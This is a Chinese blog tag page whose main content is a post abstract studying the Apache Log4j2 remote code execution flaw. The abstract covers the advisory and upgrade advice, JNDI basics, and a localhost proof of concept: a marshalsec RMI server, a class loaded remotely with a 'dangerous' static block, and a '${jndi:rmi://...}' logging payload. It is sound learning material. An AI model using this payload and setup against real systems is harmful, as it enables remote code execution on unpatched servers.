<html>
  <head>
  <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>java基础 | Gridea</title>
<link rel="shortcut icon" href="https://loser-wang.github.io/favicon.ico?v=1673338698301">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://loser-wang.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="java基础 | Gridea - Atom Feed" href="https://loser-wang.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



  <meta name="description" content="温故而知新" />
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://loser-wang.github.io">
  <img class="avatar" src="https://loser-wang.github.io/images/avatar.png?v=1673338698301" alt="">
  </a>
  <h1 class="site-title">
    Gridea
  </h1>
  <p class="site-description">
    温故而知新
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="current-tag-container">
            <h2 class="title">
                标签：# java基础
            </h2> 
        </div>
        <div class="post-container">
  
    <article class="post">
      <a href="https://loser-wang.github.io/post/java-ri-zhi-shu-li/">
        <h2 class="post-title">Java日志梳理</h2>
      </a>
      <div class="post-info">
        <span>
          2022-11-05
        </span>
        <span>
          25 min read
        </span>
        
          <a href="https://loser-wang.github.io/tag/Q99GqzLbM/" class="post-tag">
            # java基础
          </a>
        
      </div>
      
      <div class="post-abstract">
        
      </div>
    </article>
  
    <article class="post">
      <a href="https://loser-wang.github.io/post/java-properties-pei-zhi-shu-li/">
        <h2 class="post-title">Java Properties配置梳理</h2>
      </a>
      <div class="post-info">
        <span>
          2022-11-04
        </span>
        <span>
          6 min read
        </span>
        
          <a href="https://loser-wang.github.io/tag/Q99GqzLbM/" class="post-tag">
            # java基础
          </a>
        
      </div>
      
      <div class="post-abstract">
        
      </div>
    </article>
  
    <article class="post">
      <a href="https://loser-wang.github.io/post/xian-cheng-tong-bu-andyi-bu/">
        <h2 class="post-title">线程同步&amp;异步</h2>
      </a>
      <div class="post-info">
        <span>
          2022-08-09
        </span>
        <span>
          9 min read
        </span>
        
          <a href="https://loser-wang.github.io/tag/Q99GqzLbM/" class="post-tag">
            # java基础
          </a>
        
      </div>
      
      <div class="post-abstract">
        
      </div>
    </article>
  
    <article class="post">
      <a href="https://loser-wang.github.io/post/apache-log4j2-yuan-cheng-dai-ma-zhi-xing-lou-dong/">
        <h2 class="post-title">Apache Log4j2 远程代码执行漏洞</h2>
      </a>
      <div class="post-info">
        <span>
          2021-12-16
        </span>
        <span>
          8 min read
        </span>
        
          <a href="https://loser-wang.github.io/tag/Q99GqzLbM/" class="post-tag">
            # java基础
          </a>
        
          <a href="https://loser-wang.github.io/tag/code/" class="post-tag">
            # 源码
          </a>
        
      </div>
      
        <a href="https://loser-wang.github.io/post/apache-log4j2-yuan-cheng-dai-ma-zhi-xing-lou-dong/" class="post-feature-image" style="background-image: url('https://loser-wang.oss-cn-beijing.aliyuncs.com/blog/Apache%20Log4j2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/log4j%E6%BC%8F%E6%B4%9E.svg')">
        </a>
      
      <div class="post-abstract">
        <p><a name="pjBhS"></a></p>
<h1 id="漏洞介绍摘录阿里云官方">漏洞介绍(摘录阿里云官方)</h1>
<p><a href="https://help.aliyun.com/noticelist/articleid/1060971232.html">【漏洞预警】Apache Log4j2 远程代码执行漏洞</a><br /><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247486239&amp;idx=1&amp;sn=dd3eed8e9065a7f78758effd6ffe2578&amp;scene=21#wechat_redirect">https://www.yuque.com/buyiyangdeyanhuo-sinmr/gp5oyo/pnlkk8#GsXMF</a></p>
<p><a name="f2z0C"></a></p>
<h2 id="漏洞描述">漏洞描述</h2>
<p>Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。2021年12月10日，阿里云安全团队发现 Apache Log4j 2.15.0-rc1 版本存在漏洞绕过，请及时更新至 Apache Log4j 2.15.0-rc2 版本。阿里云应急响应中心提醒 Apache Log4j2 用户尽快采取安全措施阻止漏洞攻击。</p>
<p><a name="VMASj"></a></p>
<h2 id="影响版本">影响版本</h2>
<p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：<br /><strong>Apache Log4j 2.x &lt; 2.15.0-rc2</strong></p>
<p><a name="TgOmF"></a></p>
<h2 id="安全建议">安全建议</h2>
<ol>
<li>排查应用是否引入了Apache Log4j2 Jar包，若存在依赖引入，则可能存在漏洞影响。请尽快升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本，地址 https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</li>
<li>升级已知受影响的应用及组件，如 spring-boot-starter-log4j2/Apache Struts2/Apache Solr/Apache Druid/Apache Flink</li>
</ol>
<p>接着这个漏洞，学习一些知识。</p>
<p><a name="zm7Hp"></a></p>
<h1 id="jndi">JNDI</h1>
<p><a href="https://docs.oracle.com/javase/jndi/tutorial/trailmap.html">Your guide to The JNDI Tutorial</a><br /><a href="https://www.baeldung.com/jndi">Java Naming and Directory Interface Overview</a></p>
<p><a name="uk50u"></a></p>
<h2 id="概念">概念</h2>
<p>偷个懒，直接copy。其实就是jvm运行时可以读取远程的文件、对象。</p>
<p><a name="MdgO9"></a></p>
<h3 id="introducation">introducation</h3>
<p>Java Naming and Directory Interface is the name of the <a href="https://www.educba.com/interface-in-java/">interface in the Java</a> programming language. It is an API( Application Program Interface) that works with servers and can fetch files from a database using naming conventions. The naming convention can be a single phrase or a word. It can also be incorporated in a socket to implement <a href="https://www.educba.com/socket-programming-in-java/">socket programming</a> using servers transferring data files or flat files in a project. It can also be used in web pages in browsers where there are instances of many directories. JNDI provides users in Java the facility to search objects in Java using the Java coding language.</p>
<p><a name="BqeMZ"></a></p>
<h3 id="architecture">architecture</h3>
<p>The JNDI architecture consists of an API and a service provider interface (SPI). Java applications use the JNDI API to access a variety of naming and directory services. The SPI enables a variety of naming and directory services to be plugged in transparently, thereby allowing the Java application using the JNDI API to access their services. <br /><img src="https://loser-wang.oss-cn-beijing.aliyuncs.com/blog/Apache%20Log4j2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/jndi_architecture.gif" alt="jndiarch.gif" loading="lazy"></p>
<p><a name="GNcg7"></a></p>
<h3 id="packaging">Packaging</h3>
<p>JNDI is included in the Java SE Platform. To use the JNDI, you must have the JNDI classes and one or more service providers. The JDK includes service providers for the following naming/directory services:</p>
<ul>
<li>Lightweight Directory Access Protocol (LDAP)</li>
<li>Common Object Request Broker Architecture (CORBA) Common Object Services (COS) name service</li>
<li>Java Remote Method Invocation (RMI) Registry</li>
<li>Domain Name Service (DNS)</li>
</ul>
<p><a name="LhoeN"></a></p>
<h2 id="代码演示">代码演示</h2>
<p><a name="Og4ds"></a></p>
<h3 id="br"><br /></h3>
<p><a name="FZO82"></a></p>
<h3 id="jndi读取本地文件">JNDI读取本地文件</h3>
<pre><code class="language-java">package Test;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.File;
import java.util.Hashtable;

public class TestJNDI {

    public static void main(String[] args) {

        //添加环境
        Hashtable env = new Hashtable(11);
        //环境地址
        env.put(Context.PROVIDER_URL, &quot;file:/Users/loserwang/IdeaProjects/test&quot;);
        //指定为文件系统上下文，
        // com.sun.jndi.ldap.LdapCtxFactory用于LDAP
        // com.sun.jndi.fscontext.RefFSContextFactory用于文件系统上下文，它只需要使用者提供存放上下文的文件路径
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                &quot;com.sun.jndi.fscontext.RefFSContextFactory&quot;);

        try {
            //1. 初始化上下文
            Context ctx = new InitialContext(env);

            // 2. 获取name对应object
            File f = (File) ctx.lookup(&quot;pom.xml&quot;);

            System.out.println(f);

            // Close the context when we're done
            ctx.close();
        } catch (NamingException e) {
            System.out.println(&quot;Lookup failed: &quot; + e);
        }
    }
}

</code></pre>
<figure data-type="image" tabindex="1"><img src="https://loser-wang.oss-cn-beijing.aliyuncs.com/blog/Apache%20Log4j2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/jndi_out1.png" alt="jndi-out1.png" loading="lazy"></figure>
<blockquote>
<p>ps: 需要自己下载com.sun.jndi.fscontext jar包</p>
</blockquote>
<p><a name="frkTG"></a></p>
<h3 id="jndi读取rmi">JNDI读取rmi</h3>
<p><a name="YmxJN"></a></p>
<h4 id="编译要提供的类">编译要提供的类</h4>
<pre><code class="language-java">package Test;

public class Hello {
     static {
        System.out.println(&quot;做一些危险的事情&quot;);
    }
    
    public String hello(){
        return &quot;hello&quot;;
    }
}

</code></pre>
<pre><code class="language-shell">&gt; javac src/main/java/Test/Hello.java 
</code></pre>
<p><a name="M4QbV"></a></p>
<h4 id="将class文件放入服务器">将class文件放入服务器</h4>
<p><img src="https://loser-wang.oss-cn-beijing.aliyuncs.com/blog/Apache%20Log4j2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/jndi_out2.png" alt="jndi-out2.png" loading="lazy"><br>
<a name="EOC37"></a></p>
<h4 id="下载并编译marshalsec">下载并编译marshalsec</h4>
<pre><code class="language-shell">&gt; git clone https://github.com/mbechler/marshalsec
&gt; cd marshalsec
&gt; mvn clean package -DskipTests
</code></pre>
<p><a name="lWp0i"></a></p>
<h4 id="使用marshalsec提供jndi-rmi服务">使用marshalsec提供jndi rmi服务</h4>
<p>进入marshalsec的target目录下,使用marshalsec-0.0.3-SNAPSHOT-all.jar在本机的9999端口开启一个RMI服务加载TouchFile.class文件,<br />预发如下:</p>
<pre><code class="language-shell">&gt;  cd target 
&gt;  ll
total 85016
drwxr-xr-x  2 loserwang  staff    64B 12 11 15:27 archive-tmp
drwxr-xr-x  3 loserwang  staff    96B 12 11 15:27 classes
drwxr-xr-x  3 loserwang  staff    96B 12 11 15:27 generated-sources
drwxr-xr-x  3 loserwang  staff    96B 12 11 15:27 generated-test-sources
-rw-r--r--  1 loserwang  staff    41M 12 11 15:28 marshalsec-0.0.3-SNAPSHOT-all.jar
-rw-r--r--  1 loserwang  staff    99K 12 11 15:27 marshalsec-0.0.3-SNAPSHOT.jar
drwxr-xr-x  3 loserwang  staff    96B 12 11 15:27 maven-archiver
drwxr-xr-x  3 loserwang  staff    96B 12 11 15:27 maven-status
drwxr-xr-x  3 loserwang  staff    96B 12 11 15:27 test-classes

&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://localhost:8080/#Hello&quot; 9999
* Opening JRMP listener on 9999

</code></pre>
<p><a name="cbbyq"></a></p>
<h4 id="通过jndi调用rmi">通过JNDI调用rmi</h4>
<pre><code class="language-java">public class MyRmiClient {
    public static void main(String[] args) throws NamingException {
         //设置这个系统属性才能url获取jndi,不然抛出异常
        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);
        
        String url = &quot;rmi://127.0.0.1:9001/Hello&quot;;
        InitialContext context = new InitialContext();


        Hello hello = (Hello) context.lookup(url);
        System.out.println(&quot;获取成功:&quot; + hello.hello());
    }
}

</code></pre>
<p>报错如下:</p>
<blockquote>
<p>Hello cannot be cast to javax.naming.spi.ObjectFactory</p>
</blockquote>
<p>把Hello改为：</p>
<pre><code class="language-java">import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Hello implements ObjectFactory {
     static {
        System.out.println(&quot;做一些危险的事情&quot;);
    }
    
    public String hello(){
        return &quot;hello&quot;;
    }

    //context.lookup会调用getObjectInstance产生实例对象
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
        return new Hello();
    }
}

</code></pre>
<p>执行结果如下: (Hello.class被成功加载)<br /><img src="https://loser-wang.oss-cn-beijing.aliyuncs.com/blog/Apache%20Log4j2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/jndi_out3.png" alt="jndi-out3.png" loading="lazy"></p>
<p><a name="aLVdj"></a></p>
<h1 id="log4j-lookups">Log4j Lookups</h1>
<blockquote>
<p>Lookups provide a way to add values to the Log4j configuration at arbitrary places. They are a particular type of Plugin that implements the StrLookup interface.</p>
</blockquote>
<p><code>Lookups</code>提供了一种在任意位置向 Log4j 配置添加值的方法。它们是实现 <code>StrLookup</code> 接口的特殊类型的插件。<br />The JndiLookup allows variables to be retrieved via JNDI.<br /><code>JndiLookup</code>允许注入JNDI变量，并且执行结果。</p>
<p><a name="Fn23L"></a></p>
<h2 id="引入依赖bug修复前的版本">引入依赖(bug修复前的版本)</h2>
<pre><code class="language-xml">       &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
            &lt;version&gt;2.13.1&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
            &lt;version&gt;2.13.1&lt;/version&gt;
        &lt;/dependency&gt;
</code></pre>
<p><a name="IAcpy"></a></p>
<h2 id="log触发jndi-实现注入">log触发jndi, 实现注入</h2>
<pre><code class="language-java">import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class TryLog4j {

    private static Logger logger = LogManager.getLogger(TryLog4j.class);

    public static void main(String[] args) {
        logger.error(&quot;java.version: ${java:vm} \n&quot;);
        logger.error(&quot;jndi启动：${jndi:rmi://127.0.0.1:9003/Hello}&quot;);
    }
}

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://loser-wang.oss-cn-beijing.aliyuncs.com/blog/Apache%20Log4j2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/jndi_out4.png" alt="jndi-out4.png" loading="lazy"></figure>

      </div>
    </article>
  
</div>

        <div class="pagination-container">
  
  
</div>

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://loser-wang.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>
  </body>
</html>
